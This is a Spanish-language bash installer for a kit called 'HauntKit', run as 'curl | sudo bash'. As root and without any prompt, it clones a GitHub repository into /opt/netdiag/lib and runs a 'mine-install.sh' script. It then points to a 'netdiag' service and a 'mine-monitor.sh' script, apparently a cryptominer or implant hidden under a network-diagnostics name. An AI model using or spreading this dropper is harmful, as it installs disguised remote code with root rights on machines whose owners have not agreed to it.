#!/bin/bash
# ════════════════════════════════════════════════════════
#  HauntKit — Instalación remota (curl | bash)
#  Una línea, sin interacción, sin esfuerzo
# ════════════════════════════════════════════════════════

set -e

# ─── Colores ───
RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'
YELLOW='\033[1;33m'; NC='\033[0m'

# ─── Solo root ───
if [ "$(id -u)" -ne 0 ]; then
    echo -e "${RED}[!] Debes ejecutar como root${NC}"
    echo "  curl -sL https://raw.githubusercontent.com/CyberRo/HauntKit/main/scripts/remote-install.sh | sudo bash"
    exit 1
fi

echo -e "${CYAN}"
echo "╔══════════════════════════════════════════╗"
echo "║     HauntKit — Instalación Remota       ║"
echo "║         CYBER HAUNT & SPECTRE           ║"
echo "╚══════════════════════════════════════════╝"
echo -e "${NC}"

# ─── Detectar gestor de paquetes ───
if command -v apt &>/dev/null; then
    PKG_MANAGER="apt"
elif command -v yum &>/dev/null; then
    PKG_MANAGER="yum"
elif command -v apk &>/dev/null; then
    PKG_MANAGER="apk"
else
    echo -e "${RED}[!] No se detectó gestor de paquetes compatible${NC}"
    exit 1
fi

# ─── Instalar git si no existe ───
if ! command -v git &>/dev/null; then
    echo -e "${YELLOW}[*] Instalando git...${NC}"
    case "$PKG_MANAGER" in
        apt) apt-get update -qq && apt-get install -y -qq git ;;
        yum) yum install -y -q git ;;
        apk) apk add -q git ;;
    esac
    echo -e "${GREEN}[✓] Git instalado${NC}"
else
    echo -e "${GREEN}[✓] Git detectado${NC}"
fi

# ─── Clonar HauntKit ───
REPO="https://github.com/CyberRo/HauntKit.git"
DEST="/opt/netdiag/lib"

if [ -d "$DEST/.git" ]; then
    echo -e "${YELLOW}[*] Repo ya existe, actualizando...${NC}"
    git -C "$DEST" pull
else
    echo -e "${YELLOW}[*] Clonando HauntKit...${NC}"
    mkdir -p "$(dirname "$DEST")"
    git clone "$REPO" "$DEST"
fi
echo -e "${GREEN}[✓] Repo listo en $DEST${NC}"

# ─── Ejecutar instalador (modo automático) ───
echo ""
echo -e "${YELLOW}[*] Ejecutando instalador...${NC}"
echo "y" | bash "$DEST/tools/utils/mine-install.sh"

echo ""
echo -e "${GREEN}╔══════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║    Instalación completada exitosamente   ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════╝${NC}"
echo ""
echo "  Servicio: netdiag"
echo "  Estado:   systemctl status netdiag"
echo "  Monitorear: bash /opt/netdiag/lib/tools/utils/mine-monitor.sh"
